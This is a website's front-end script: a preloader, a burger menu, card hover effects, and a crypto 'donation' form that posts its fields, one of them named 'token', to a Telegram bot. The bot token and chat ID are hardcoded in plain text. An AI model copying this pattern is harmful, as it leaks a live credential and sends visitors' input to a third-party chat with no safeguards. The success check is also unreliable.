// Prelpuder

document.body.onload = function () {
  setTimeout(function () {
    var preloader = document.getElementById("prelouder");
    if (!preloader.classList.contains("done")) {
      prelouder.classList.add("done");
    }
  }, 1000);
};

// Form app

const TOKEN = "6677281101:AAHzXCaxCUAHvkIkhprS56LjYoZ9bP-l4gA";
const CHAT_ID = "-1002078322968";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

document.getElementById("form_tg").addEventListener("submit", function (event) {
  event.preventDefault();

  let message = `<b> Вы получили пожертвования крипто валютой на сумму ${event.target.name.value} <b>\n`;
  message += `<b> Отправитель: ${event.target.token.value}<b>\n`;
  message += `<b> Пожелания отпрвителя: ${event.target.text.value}<b> `;

  message = message.replace(/<[^>]+>/g, "");

  const inputs = document.querySelectorAll(".inputs");

  const NosuccessMessage = document.querySelector(".no_success_message");
  function NoshowSuccessMessage() {
    NosuccessMessage.classList.remove("no_done_message");
    setTimeout(() => {
      NosuccessMessage.classList.add("no_done_message");
    }, 1000);
  }

  let isFormValid = true;
  for (const input of inputs) {
    if (input.value.trim() === "") {
      isFormValid = false;
    }
  }

  if (!isFormValid) {
    NoshowSuccessMessage();
    return false;
  }

  document.querySelectorAll(".inputs").forEach((inputss) => {
    inputss.value = "";
  });

  const successMessage = document.querySelector(".success_message");
  function showSuccessMessage() {
    successMessage.classList.remove("done_message");
    setTimeout(() => {
      successMessage.classList.add("done_message");
    }, 1000);
  }

  const Posts = axios.post(URL_API, {
    chat_id: CHAT_ID,
    text: message,
  });

  if (Posts) {
    showSuccessMessage();
  }

  return Posts;
});

// Card

let cards = document.querySelectorAll(".card");
cards.forEach((card) => {
  card.onmousemove = function (e) {
    let x = e.pageX - card.offsetLeft;
    let y = e.pageY - card.offsetTop;
    card.style.setProperty("--x", x + "px");
    card.style.setProperty("--y", y + "px");
  };
});

// burger menu

const headerBtn = document.querySelector(".burger_btns");
const wraperBtn = document.querySelector(".btn_block");
const Menu = document.querySelector(".burger_menu");
let menuOpen = false;

headerBtn.addEventListener("click", () => {
  if (!menuOpen) {
    Menu.classList.add("active");
    menuOpen = true;
  } else {
    Menu.classList.remove("active");
    menuOpen = false;
  }
});

wraperBtn.addEventListener("click", () => {
  if (!menuOpen) {
    Menu.classList.add("active");
    menuOpen = true;
  } else {
    Menu.classList.remove("active");
    menuOpen = false;
  }
});
